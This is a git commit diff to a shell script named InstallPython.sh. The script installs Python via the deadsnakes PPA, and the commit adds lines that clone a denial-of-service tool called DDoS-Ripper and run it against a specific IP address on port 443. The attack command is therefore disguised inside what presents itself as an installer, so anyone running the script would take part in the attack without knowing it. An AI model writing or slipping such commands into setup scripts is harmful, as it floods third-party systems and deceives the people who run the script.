a98fb458dba3577e5eadf99fcb8f9533c3690819
zagnafeynt <zagnafey@gmail.com>
2022-03-16 12:45:21 +0000

    second change

--- InstallPython.sh
+++ InstallPython.sh
@@ -1,5 +1,9 @@
+sudo apt update
 sudo apt install software-properties-common
 sudo add-apt-repository ppa:deadsnakes/ppa
 sudo apt-get update
 sudo apt-get install python3
+git clone https://github.com/palahsu/DDoS-Ripper.git
+cd DDoS-Ripper
+python3 DRipper.py -s 194.54.15.193 -p 443
 
